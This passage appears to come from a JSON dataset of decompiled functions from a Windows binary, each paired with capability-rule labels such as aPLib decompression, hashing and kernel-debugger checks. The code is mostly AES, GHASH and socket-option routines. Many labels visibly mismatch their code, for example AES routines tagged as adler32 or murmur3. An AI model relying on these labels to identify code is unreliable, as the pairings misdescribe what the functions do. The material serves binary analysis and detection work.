0x42c600) ^ uVar4;\n    uVar1 = *((uVar3 >> 0x10 & 0xff) * 4 + 0x42c600);\n    uVar2 = *((uVar5 >> 8 & 0xff) * 4 + 0x42c600);\n    param_3[0xb] = uVar9;\n    param_3[8] = uVar9 >> 0x18;\n    param_3[9] = uVar4 >> 0x10 ^ uVar1 >> 0x10;\n    param_3[10] = uVar4 >> 8 ^ uVar2 >> 8;\n    uVar4 = param_1[3];\n    uVar3 = *((uVar3 >> 0x18) * 4 + 0x42c600) & 0xff000000 ^ *((uVar7 & 0xff) * 4 + 0x42c600) ^ uVar4;\n    uVar1 = *((uVar5 >> 0x10 & 0xff) * 4 + 0x42c600);\n    uVar2 = *((uVar6 >> 8 & 0xff) * 4 + 0x42c600);\n    param_3[0xf] = uVar3;\n    param_3[0xc] = uVar3 >> 0x18;\n    param_3[0xd] = uVar4 >> 0x10 ^ uVar1 >> 0x10;\n    param_3[0xe] = uVar4 >> 8 ^ uVar2 >> 8;\n    return;\n}\n",
        "token_count": 2096
    },
    "00403989": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\nvoid fcn.00403989(void)\n\n{\n    uchar uVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    uint32_t uVar9;\n    uint8_t auStack1040 [511];\n    uint8_t auStack529 [257];\n    uchar auStack272 [256];\n    \n    uVar2 = 1;\n    iVar8 = 0;\n    do {\n        auStack1040[iVar8 + 0x100] = uVar2;\n        auStack1040[uVar2] = iVar8;\n        iVar8 = iVar8 + 1;\n        uVar2 = fcn.00403962(uVar2, 3);\n    } while (iVar8 != 0xff);\n    uVar7 = 0;\n    iVar8 = 0;\n    while( true ) {\n        iVar3 = 0;\n        uVar9 = 0;\n        do {\n            uVar2 = iVar3;\n            iVar3 = iVar3 + 1;\n            uVar9 = uVar9 | ((uVar7 >> (uVar2 + 4 & 7) ^ (uVar7 ^ 99) >> (uVar2 & 0x1f) ^ uVar7 >> (uVar2 + 5 & 7) ^\n                              uVar7 >> (uVar2 + 6 & 7) ^ uVar7 >> (uVar2 + 7 & 7)) & 1U) << (uVar2 & 0x1f);\n        } while (iVar3 != 8);\n        auStack529[iVar8 + 1] = uVar9;\n        auStack272[uVar9 & 0xff] = iVar8;\n        if (iVar8 + 1 == 0x100) break;\n        uVar7 = auStack529[-auStack1040[iVar8 + 1]];\n        iVar8 = iVar8 + 1;\n    }\n    auStack529[2] = 0x7c;\n    auStack272[124] = 1;\n    iVar8 = 0;\n    auStack272[99] = 0;\n    do {\n        uVar2 = auStack529[iVar8 + 1];\n        uVar7 = fcn.00403962(uVar2, 2);\n        uVar7 = uVar7 & 0xff;\n        uVar9 = fcn.00403962(uVar2, 1);\n        uVar9 = uVar9 & 0xff;\n        uVar4 = uVar9 << 8;\n        uVar5 = fcn.00403962(uVar2, 3);\n        uVar5 = uVar5 & 0xff;\n        *(iVar8 * 4 + 0x42da00) = uVar7 << 0x18 | uVar9 << 0x10 | uVar5 | uVar4;\n        *(iVar8 * 4 + 0x42ce00) = uVar5 << 0x18 | uVar4 | uVar9 | uVar7 << 0x10;\n        uVar1 = auStack272[iVar8];\n        *(iVar8 * 4 + 0x42d600) = uVar5 << 0x10 | uVar9 << 0x18 | uVar9 | uVar7 << 8;\n        uVar6 = uVar9 << 0x10 | uVar9 << 0x18;\n        *(iVar8 * 4 + 0x42de00) = uVar7 | uVar5 << 8 | uVar6;\n        *(iVar8 * 4 + 0x42c600) = uVar9 | uVar4 | uVar6;\n        uVar7 = fcn.00403962(uVar1, 0xe);\n        uVar7 = uVar7 & 0xff;\n        uVar9 = fcn.00403962(uVar1, 9);\n        uVar9 = uVar9 & 0xff;\n        uVar4 = fcn.00403962(uVar1, 0xd);\n        uVar4 = uVar4 & 0xff;\n        uVar5 = fcn.00403962(uVar1, 0xb);\n        uVar5 = uVar5 & 0xff;\n        *(iVar8 * 4 + 0x42d200) = uVar7 << 0x18 | uVar9 << 0x10 | uVar5 | uVar4 << 8;\n        *(iVar8 * 4 + 0x42be00) = uVar7 << 0x10 | uVar5 << 0x18 | uVar4 | uVar9 << 8;\n        *(iVar8 * 4 + 0x42c200) = uVar5 << 0x10 | uVar4 << 0x18 | uVar9 | uVar7 << 8;\n        *(iVar8 * 4 + 0x42ba00) = uVar7 | uVar4 << 0x10 | uVar9 << 0x18 | uVar5 << 8;\n        uVar7 = fcn.00403962(uVar1, 1);\n        uVar7 = uVar7 & 0xff;\n        *(iVar8 * 4 + 0x42ca00) = uVar7 << 8 | uVar7 << 0x10 | uVar7 << 0x18 | uVar7;\n        iVar8 = iVar8 + 1;\n    } while (iVar8 != 0x100);\n    return;\n}\n",
        "token_count": 1250
    },
    "00410284": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\nint32_t fcn.00410284(void)\n\n{\n    *0x4229d0 = *0x4229d0 * 0x10000 + (*0x4229d0 & 0xffff) * 0x9069;\n    *0x4229d4 = *0x4229d4 * 0x10000 + (*0x4229d4 & 0xffff) * 18000;\n    return *0x4229d0 * 0x1000 + *0x4229d4;\n}\n",
        "token_count": 120
    },
    "004211c0": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\nvoid fcn.004211c0(int32_t param_1, uint32_t param_2, uint32_t *param_3, uint8_t *param_4)\n\n{\n    uint32_t uVar1;\n    uint32_t *puVar2;\n    uint32_t uVar3;\n    uint8_t *puVar4;\n    uint8_t *puVar5;\n    uint32_t uVar6;\n    \n    uVar1 = param_1 * 4 + 4;\n    if (param_2 == 0) {\n        (*_sym.imp.msvcrt.dll__assert)(\"nk != 0\", \"../nettle-3.5.1/aes-set-key-internal.c\", 0x38);\n    }\n    else {\n        puVar2 = param_3;\n        puVar4 = param_4;\n        do {\n            puVar5 = puVar4 + 4;\n            *puVar2 = puVar4[3] << 0x18 | puVar4[2] << 0x10 | *puVar4 | puVar4[1] << 8;\n            puVar2 = puVar2 + 1;\n            puVar4 = puVar5;\n        } while (param_4 + param_2 * 4 != puVar5);\n    }\n    if (param_2 < uVar1) {\n        uVar6 = param_2;\n        puVar4 = 0x426aa0;\n        do {\n            uVar3 = param_3[uVar6 - 1];\n            if (uVar6 % param_2 == 0) {\n                puVar5 = puVar4 + 1;\n                uVar3 = *puVar4 ^ (str.cw[(uVar3 >> 8 & 0xff00) >> 8] << 8 |\n                                   str.cw[uVar3 & 0xff] << 0x18 | str.cw[uVar3 >> 8 & 0xff] |\n                                  str.cw[uVar3 >> 0x18] << 0x10);\n            }\n            else {\n                puVar5 = puVar4;\n                if ((uVar6 % param_2 == 4) && (6 < param_2)) {\n                    uVar3 = str.cw[uVar3 >> 8 & 0xff] << 8 | str.cw[uVar3 >> 0x18] << 0x18 | str.cw[uVar3 & 0xff] |\n                            str.cw[uVar3 >> 0x10 & 0xff] << 0x10;\n                }\n            }\n            param_3[uVar6] = uVar3 ^ param_3[uVar6 - param_2];\n            uVar6 = uVar6 + 1;\n            puVar4 = puVar5;\n        } while (uVar6 != uVar1);\n    }\n    return;\n}\n",
        "token_count": 627
    },
    "0040e4f7": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\nushort fcn.0040e4f7(uint *param_1)\n\n{\n    uchar uVar1;\n    uchar uVar2;\n    uchar *puVar3;\n    \n    puVar3 = *param_1;\n    uVar1 = *puVar3;\n    uVar2 = puVar3[1];\n    *param_1 = puVar3 + 2;\n    return CONCAT11(uVar1, uVar2);\n}\n",
        "token_count": 95
    },
    "0041fcd0": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\nvoid fcn.0041fcd0(void)\n\n{\n    uint16_t uVar1;\n    uint32_t uVar2;\n    uint32_t *in_EAX;\n    \n    uVar1 = *((in_EAX[3] >> 0x18) * 2 + 0x426820);\n    in_EAX[3] = in_EAX[3] << 8 | in_EAX[2] >> 0x18;\n    in_EAX[2] = in_EAX[2] << 8 | in_EAX[1] >> 0x18;\n    uVar2 = *in_EAX;\n    *in_EAX = uVar2 << 8 ^ uVar1;\n    in_EAX[1] = in_EAX[1] << 8 | uVar2 >> 0x18;\n    return;\n}\n",
        "token_count": 185
    },
    "00402e68": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nint32_t fcn.00402e68(uint32_t *param_1, int32_t param_2, uint param_3, uint param_4)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t *puVar3;\n    int32_t iVar4;\n    \n    iVar2 = fcn.00402afc(param_1, param_3, param_4);\n    puVar3 = iVar2 * 0x10 + param_2;\n    *puVar3 = *param_1;\n    puVar3[1] = param_1[1];\n    puVar3[2] = param_1[2];\n    puVar3[3] = param_1[3];\n    for (iVar4 = 1; iVar4 < iVar2; iVar4 = iVar4 + 1) {\n        uVar1 = param_1[4];\n        puVar3[-4] = *(*((uVar1 >> 0x18) * 4 + 0x42c600) * 4 + 0x42d200) ^\n                     *(*((uVar1 & 0xff) * 4 + 0x42c600) * 4 + 0x42ba00) ^\n                     *(*((uVar1 >> 0x10 & 0xff) * 4 + 0x42c600) * 4 + 0x42be00) ^\n                     *(*((uVar1 >> 8 & 0xff) * 4 + 0x42c600) * 4 + 0x42c200);\n        uVar1 = param_1[5];\n        puVar3[-3] = *(*((uVar1 >> 0x18) * 4 + 0x42c600) * 4 + 0x42d200) ^\n                     *(*((uVar1 & 0xff) * 4 + 0x42c600) * 4 + 0x42ba00) ^\n                     *(*((uVar1 >> 0x10 & 0xff) * 4 + 0x42c600) * 4 + 0x42be00) ^\n                     *(*((uVar1 >> 8 & 0xff) * 4 + 0x42c600) * 4 + 0x42c200);\n        uVar1 = param_1[6];\n        puVar3[-2] = *(*((uVar1 >> 0x18) * 4 + 0x42c600) * 4 + 0x42d200) ^\n                     *(*((uVar1 & 0xff) * 4 + 0x42c600) * 4 + 0x42ba00) ^\n                     *(*((uVar1 >> 0x10 & 0xff) * 4 + 0x42c600) * 4 + 0x42be00) ^\n                     *(*((uVar1 >> 8 & 0xff) * 4 + 0x42c600) * 4 + 0x42c200);\n        uVar1 = param_1[7];\n        puVar3[-1] = *(*((uVar1 >> 0x18) * 4 + 0x42c600) * 4 + 0x42d200) ^\n                     *(*((uVar1 & 0xff) * 4 + 0x42c600) * 4 + 0x42ba00) ^\n                     *(*((uVar1 >> 0x10 & 0xff) * 4 + 0x42c600) * 4 + 0x42be00) ^\n                     *(*((uVar1 >> 8 & 0xff) * 4 + 0x42c600) * 4 + 0x42c200);\n        puVar3 = puVar3 + -4;\n        param_1 = param_1 + 4;\n    }\n    puVar3[-4] = param_1[4];\n    puVar3[-3] = param_1[5];\n    puVar3[-2] = param_1[6];\n    puVar3[-1] = param_1[7];\n    return iVar2;\n}\n",
        "token_count": 922
    },
    "004042c8": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.004042c8(uint param_1, uint32_t param_2, int32_t param_3)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = param_3 + -1;\n    while (-1 < iVar1) {\n        if ((*(iVar1 * 2 + 0x422e40) & param_3 >> 0x10) != 0) {\n            *0x42b090 = *0x42b090 | *(*0x422060 * 2 + 0x422e40);\n        }\n        iVar1 = iVar1 + -1;\n        *0x422060 = *0x422060 + -1;\n        if (*0x422060 < '\\0') {\n            param_2 = *0x42b090;\n            if (*0x42b090 == 0xff) {\n                fcn.0040410c(0xff);\n                param_2 = 0;\n            }\n            fcn.0040410c();\n            *0x422060 = '\\a';\n            *0x42b090 = 0;\n        }\n    }\n    return param_2;\n}\n",
        "token_count": 253
    },
    "0040aec6": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nvoid fcn.0040aec6(uchar *param_1, uint32_t *param_2)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    \n    uVar2 = *param_2 & 0x3f;\n    iVar3 = uVar2 + 1;\n    *(param_2 + uVar2 + 0x18) = 0x80;\n    uVar1 = 0x40 - iVar3;\n    if (uVar1 < 8) {\n        fcn.004129e4(param_2 + uVar2 + 0x19, 0, uVar1);\n        fcn.0040a728();\n        uVar1 = 0x40;\n        iVar3 = 0;\n    }\n    fcn.004129e4(param_2 + iVar3 + 0x18, 0, uVar1 - 8);\n    uVar2 = *param_2 << 3;\n    *param_2 = uVar2;\n    *(param_2 + 0x14) = uVar2;\n    *(param_2 + 0x51) = uVar2 >> 8;\n    *(param_2 + 0x53) = uVar2 >> 0x18;\n    uVar1 = param_2[1];\n    *(param_2 + 0x52) = uVar2 >> 0x10;\n    *(param_2 + 0x15) = uVar1;\n    *(param_2 + 0x55) = uVar1 >> 8;\n    *(param_2 + 0x57) = uVar1 >> 0x18;\n    *(param_2 + 0x56) = uVar1 >> 0x10;\n    fcn.0040a728();\n    *param_1 = param_2[2];\n    param_1[1] = param_2[2] >> 8;\n    param_1[2] = *(param_2 + 10);\n    param_1[3] = *(param_2 + 0xb);\n    param_1[4] = param_2[3];\n    param_1[5] = param_2[3] >> 8;\n    param_1[6] = *(param_2 + 0xe);\n    param_1[7] = *(param_2 + 0xf);\n    param_1[8] = param_2[4];\n    param_1[9] = param_2[4] >> 8;\n    param_1[10] = *(param_2 + 0x12);\n    param_1[0xb] = *(param_2 + 0x13);\n    param_1[0xc] = param_2[5];\n    param_1[0xd] = param_2[5] >> 8;\n    param_1[0xe] = *(param_2 + 0x16);\n    param_1[0xf] = *(param_2 + 0x17);\n    fcn.004129e4(param_2, 0, 0x98);\n    return;\n}\n",
        "token_count": 698
    },
    "00414900": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00414900(uint param_1, uint param_2)\n\n{\n    uchar *in_EAX;\n    \n    *in_EAX = param_2;\n    in_EAX[1] = param_2 >> 8;\n    in_EAX[3] = param_2 >> 0x18;\n    in_EAX[2] = param_2 >> 0x10;\n    return;\n}\n",
        "token_count": 92
    },
    "0041feb0": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nvoid fcn.0041feb0(int32_t param_1, int32_t param_2, int32_t param_3, int32_t param_4)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uchar uStack44;\n    uchar uStack43;\n    uchar uStack42;\n    uint8_t uStack41;\n    uint32_t uStack40;\n    uchar uStack36;\n    uchar uStack35;\n    uchar uStack34;\n    uint8_t uStack33;\n    uint32_t uStack32;\n    \n    param_2 = param_2 << 3;\n    uStack41 = param_2 | param_1 >> 0x1d;\n    uVar1 = param_1 << 3;\n    param_4 = param_4 << 3;\n    uStack33 = param_4 | param_3 >> 0x1d;\n    uVar2 = param_3 << 3;\n    uStack32 = uVar2 >> 0x18 | (uVar2 & 0xff0000) >> 8 | (uVar2 & 0xff00) << 8 | param_3 << 0x1b;\n    uStack44 = param_2 >> 0x18;\n    uStack34 = param_4 >> 8;\n    uStack43 = param_2 >> 0x10;\n    uStack42 = param_2 >> 8;\n    uStack40 = uVar1 >> 0x18 | (uVar1 & 0xff0000) >> 8 | (uVar1 & 0xff00) << 8 | param_1 << 0x1b;\n    uStack36 = param_4 >> 0x18;\n    uStack35 = param_4 >> 0x10;\n    fcn.0041fe20(&uStack44);\n    return;\n}\n",
        "token_count": 412
    },
    "00420f40": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00420f40(int32_t noname_0, uint32_t *noname_1, int32_t noname_2, uint32_t noname_3, uint32_t *noname_4, \n            uint32_t *noname_5, uint noname_6, uint noname_7, uint noname_8, uint noname_9, uint noname_10, \n            uint noname_11, uint noname_12, uint noname_13, uint noname_14, uint noname_15, uint noname_16, \n            uint noname_17, uint noname_18, uint noname_19, uint noname_20, uint noname_21, uint noname_22, \n            uint noname_23, uint noname_24, uint noname_25, uint noname_26, uint noname_27, uint noname_28, \n            uint noname_29, uint noname_30, uint noname_31, uint noname_32, uint noname_33, uint noname_34, \n            uint noname_35, uint noname_36, uint noname_37, uint noname_38, uint noname_39, uint noname_40, \n            uint noname_41, uint noname_42, uint noname_43, uint noname_44, uint noname_45, uint noname_46, \n            uint noname_47, uint noname_48, uint noname_49, uint noname_50, uint noname_51, uint noname_52, \n            uint noname_53, uint noname_54, uint noname_55, uint noname_56, uint noname_57, uint noname_58, \n            uint noname_59, uint noname_60, uint noname_61, uint arg_100h)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    int32_t iVar12;\n    int32_t iStack24;\n    uint32_t *puStack20;\n    \n    if (noname_3 != 0) {\n        noname_3 = noname_3 >> 4;\n        do {\n            uVar2 = *noname_5 ^ *noname_1;\n            uVar5 = noname_5[1] ^ noname_1[1];\n            uVar3 = noname_5[2] ^ noname_1[2];\n            uVar4 = noname_5[3] ^ noname_1[3];\n            noname_5 = noname_5 + 4;\n            iStack24 = noname_0 + -1;\n            puVar1 = noname_1 + 4;\n            do {\n                puStack20 = puVar1;\n                uVar6 = uVar2 >> 0x18;\n                uVar7 = uVar2 >> 0x10;\n                uVar8 = uVar5 >> 0x18;\n                uVar11 = uVar2 >> 8;\n                uVar9 = uVar5 >> 0x10;\n                uVar10 = uVar3 >> 0x18;\n                uVar2 = *(noname_2 + 0x100 + (uVar2 & 0xff) * 4) ^ *(noname_2 + 0x500 + (uVar5 >> 8 & 0xff) * 4) ^\n                        *(noname_2 + 0x900 + (uVar3 >> 0x10 & 0xff) * 4) ^ *(noname_2 + 0xd00 + (uVar4 >> 0x18) * 4) ^\n                        *puStack20;\n                uVar5 = *(noname_2 + 0x100 + (uVar5 & 0xff) * 4) ^ *(noname_2 + 0x500 + (uVar3 >> 8 & 0xff) * 4) ^\n                        *(noname_2 + 0x900 + (uVar4 >> 0x10 & 0xff) * 4) ^ *(noname_2 + 0xd00 + uVar6 * 4) ^\n                        puStack20[1];\n                uVar3 = *(noname_2 + 0x100 + (uVar3 & 0xff) * 4) ^ *(noname_2 + 0x500 + (uVar4 >> 8 & 0xff) * 4) ^\n                        *(noname_2 + 0x900 + (uVar7 & 0xff) * 4) ^ *(noname_2 + 0xd00 + uVar8 * 4) ^ puStack20[2];\n                uVar4 = *(noname_2 + 0x100 + (uVar4 & 0xff) * 4) ^ *(noname_2 + 0x500 + (uVar11 & 0xff) * 4) ^\n                        *(noname_2 + 0x900 + (uVar9 & 0xff) * 4) ^ *(noname_2 + 0xd00 + uVar10 * 4) ^ puStack20[3];\n                iStack24 = iStack24 + -1;\n                puVar1 = puStack20 + 4;\n            } while (iStack24 != 0);\n            uVar11 = (*(noname_2 + (uVar2 & 0xff)) | uVar5 & 0xff00 | uVar3 & 0xff0000) << 8 | uVar4 >> 0x18;\n            uVar7 = (*(noname_2 + (uVar5 & 0xff)) | uVar3 & 0xff00 | uVar4 & 0xff0000) << 8 | uVar2 >> 0x18;\n            uVar6 = (*(noname_2 + (uVar3 & 0xff)) | uVar4 & 0xff00 | uVar2 & 0xff0000) << 8 | uVar5 >> 0x18;\n            uVar2 = (*(noname_2 + (uVar4 & 0xff)) | uVar2 & 0xff00 | uVar5 & 0xff0000) << 8 | uVar3 >> 0x18;\n            iVar12 = 3;\n            do {\n                uVar11 = (uVar11 & 0xffffff00 | *(noname_2 + (uVar11 & 0xff))) << 8 | uVar11 >> 0x18;\n                uVar7 = (uVar7 & 0xffffff00 | *(noname_2 + (uVar7 & 0xff))) << 8 | uVar7 >> 0x18;\n                uVar6 = (uVar6 & 0xffffff00 | *(noname_2 + (uVar6 & 0xff))) << 8 | uVar6 >> 0x18;\n                uVar2 = (uVar2 & 0xffffff00 | *(noname_2 + (uVar2 & 0xff))) << 8 | uVar2 >> 0x18;\n                iVar12 = iVar12 + -1;\n            } while (iVar12 != 0);\n            uVar3 = puStack20[5];\n            uVar4 = puStack20[6];\n            uVar5 = puStack20[7];\n            *noname_4 = uVar11 ^ puStack20[4];\n            noname_4[1] = uVar7 ^ uVar3;\n            noname_4[2] = uVar6 ^ uVar4;\n            noname_4[3] = uVar2 ^ uVar5;\n            noname_4 = noname_4 + 4;\n            noname_3 = noname_3 - 1;\n        } while (noname_3 != 0);\n    }\n    return;\n}\n",
        "token_count": 1826
    },
    "00403962": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nuint32_t fcn.00403962(uint8_t param_1, uint8_t param_2)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    \n    uVar2 = param_1;\n    uVar1 = 0;\n    while (param_2 != 0) {\n        if ((param_2 & 1) != 0) {\n            uVar1 = uVar1 ^ uVar2;\n        }\n        uVar2 = uVar2 * 2;\n        param_2 = param_2 >> 1;\n        if ((uVar2 & 0x100) != 0) {\n            uVar2 = uVar2 ^ 0x11b;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 167
    },
    "0041ff50": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nvoid fcn.0041ff50(uint *param_1, uint param_2, code *param_3)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t *puVar3;\n    uint32_t *puVar4;\n    uint32_t uVar5;\n    uint32_t *puVar6;\n    uint32_t *puVar7;\n    int32_t iVar8;\n    uint32_t uVar9;\n    int32_t iVar10;\n    int32_t iStack32;\n    \n    *param_1 = 0;\n    param_1[1] = 0;\n    param_1[2] = 0;\n    param_1[3] = 0;\n    (*param_3)(param_2, 0x10, param_1 + 0x200, param_1);\n    iStack32 = 7;\n    uVar5 = 0x80;\n    uVar9 = 0x40;\n    do {\n        puVar3 = param_1 + (uVar5 & 0xfffffffe) * 4;\n        puVar7 = param_1 + uVar9 * 4;\n        uVar5 = puVar3[3];\n        uVar1 = puVar3[2];\n        puVar7[3] = (uVar5 & 0x10101) << 0xf | uVar5 >> 1 & 0x7f7f7f7f | uVar1 >> 0x11 & 0x80;\n        uVar2 = puVar3[1];\n        puVar7[2] = (uVar1 & 0x10101) << 0xf | uVar1 >> 1 & 0x7f7f7f7f | uVar2 >> 0x11 & 0x80;\n        uVar1 = *puVar3;\n        puVar7[1] = (uVar2 & 0x10101) << 0xf | uVar2 >> 1 & 0x7f7f7f7f | uVar1 >> 0x11 & 0x80;\n        iStack32 = iStack32 + -1;\n        *puVar7 = (uVar5 << 7) >> 0x1f & 0xe1U ^ ((uVar1 & 0x10101) << 0xf | uVar1 >> 1 & 0x7f7f7f7f);\n        uVar5 = uVar9;\n        uVar9 = uVar9 >> 1;\n    } while (iStack32 != 0);\n    iVar8 = 7;\n    iVar10 = 2;\n    do {\n        puVar6 = param_1 + iVar10 * 4;\n        puVar3 = param_1 + 4;\n        puVar7 = puVar6;\n        do {\n            puVar4 = puVar3 + 4;\n            puVar7[4] = *puVar6 ^ *puVar3;\n            puVar7[5] = puVar6[1] ^ puVar3[1];\n            puVar7[6] = puVar6[2] ^ puVar3[2];\n            puVar7[7] = puVar6[3] ^ puVar3[3];\n            puVar3 = puVar4;\n            puVar7 = puVar7 + 4;\n        } while (puVar6 != puVar4);\n        iVar10 = iVar10 * 2;\n        iVar8 = iVar8 + -1;\n    } while (iVar8 != 0);\n    return;\n}\n",
        "token_count": 794
    },
    "00415fc6": {
        "rules": [
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b",
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00415fc6(int16_t *param_1, int16_t *param_2)\n\n{\n    int32_t *piVar1;\n    uchar auStack16 [8];\n    \n    piVar1 = sub.msvcrt.dll_localtime(auStack16);\n    *param_2 = (*piVar1 >> 1) + (piVar1[1] << 5) + (piVar1[2] << 0xb);\n    *param_1 = (piVar1[4] + 1) * 0x20 + (piVar1[5] + -0x50) * 0x200 + piVar1[3];\n    return;\n}\n",
        "token_count": 154
    },
    "00405214": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.00405214(uint param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uchar uStack37;\n    uchar auStack36 [12];\n    uint auStack24 [3];\n    \n    if ((param_2 & 1) != 0) {\n        auStack24[0] = 1;\n        sub.WS2_32.dll_ioctlsocket(param_1, 0x8004667e, auStack24);\n    }\n    if ((param_2 & 2) != 0) {\n        uStack37 = 1;\n        iVar1 = sub.WS2_32.dll_setsockopt(param_1, 0xffff, 8, &uStack37, 1);\n        if (iVar1 == 0) {\n            uStack56 = 1;\n            uStack52 = 180000;\n            uStack48 = 5000;\n            sub.WS2_32.dll_WSAIoctl(param_1, 0x98000004, &uStack56, 0xc, 0, 0, &uStack37, 0, 0);\n        }\n    }\n    if ((param_2 & 4) != 0) {\n        auStack36[0] = 1;\n        sub.WS2_32.dll_setsockopt(param_1, 6, 1, auStack36, 1);\n    }\n    return;\n}\n",
        "token_count": 326
    },
    "00407ba7": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint32_t fcn.00407ba7(char *param_1)\n\n{\n    char cVar1;\n    ushort uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    char *pcVar5;\n    uchar *puVar6;\n    ushort uStack1614;\n    ushort uStack1612;\n    ushort uStack1610;\n    ushort uStack1608;\n    ushort uStack1606;\n    ushort uStack1604;\n    uint uStack1602;\n    ushort uStack1598;\n    uint uStack1596;\n    uint uStack1592;\n    uint uStack1588;\n    uchar auStack1560 [516];\n    uchar auStack1044 [1032];\n    \n    iVar3 = -1;\n    pcVar5 = param_1;\n    do {\n        if (iVar3 == 0) break;\n        iVar3 = iVar3 + -1;\n        cVar1 = *pcVar5;\n        pcVar5 = pcVar5 + 1;\n    } while (cVar1 != '\\0');\n    puVar6 = auStack1560;\n    for (iVar3 = -iVar3; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    sub.msvcrt.dll_strcpy(auStack1560, param_1);\n    uStack1608 = 0x204;\n    uStack1606 = 0;\n    uStack1612 = SUB42(auStack1044, 0);\n    uVar2 = uStack1612;\n    uStack1610 = auStack1044 >> 0x10;\n    uStack1604 = uStack1610;\n    uStack1614 = 0;\n    sub.KERNEL32.dll_MultiByteToWideChar(0xfde9, 0, auStack1560, 0x204);\n    uStack1614 = 0;\n    uStack1612 = 0;\n    uStack1610 = 3;\n    uStack1608 = 0;\n    uStack1602 = 0x422f62;\n    uStack1598 = 0x414;\n    uStack1596 = 0;\n    uStack1592 = 0;\n    uStack1588 = 0x422f62;\n    uStack1606 = uVar2;\n    iVar3 = sub.SHELL32.DLL_SHFileOperationW(&uStack1614);\n    uVar4 = 0;\n    if (iVar3 == 0) {\n        uVar4 = fcn.0040729c(param_1);\n        uVar4 = (uVar4 ^ 1) & 0xff;\n    }\n    return uVar4 & 1;\n}\n",
        "token_count": 605
    },
    "0041a64c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nvoid fcn.0041a64c(uint *param_1, uint param_2, uint param_3, uint32_t param_4)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    \n    *param_1 = param_2;\n    param_1[2] = param_4;\n    param_1[1] = param_3;\n    param_1[3] = ((param_4 & 0xfff) + 2) / 3 + 1;\n    param_1[5] = param_4 >> 0xe & 1;\n    param_1[4] = (((param_4 & 0xfff) >> 2) + 2U) / 3 + 1;\n    if ((param_4 & 0x8000) == 0) {\n        puVar2 = param_1 + 0x29272;\n        for (iVar1 = 0x4000; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *puVar2 = 0;\n            puVar2 = puVar2 + 1;\n        }\n    }\n    param_1[0x11] = 0;\n    param_1[0x10] = 0;\n    param_1[0xf] = 0;\n    param_1[10] = param_1 + 0x9273;\n    param_1[9] = 0;\n    param_1[8] = 0;\n    param_1[7] = 0;\n    param_1[0xb] = param_1 + 0x9272;\n    param_1[0x1a] = 0;\n    param_1[0x12] = 0;\n    param_1[0x19] = 0;\n    param_1[0xc] = param_1 + 0x39272;\n    param_1[0xd] = param_1 + 0x39272;\n    param_1[0x18] = 0;\n    param_1[0x17] = 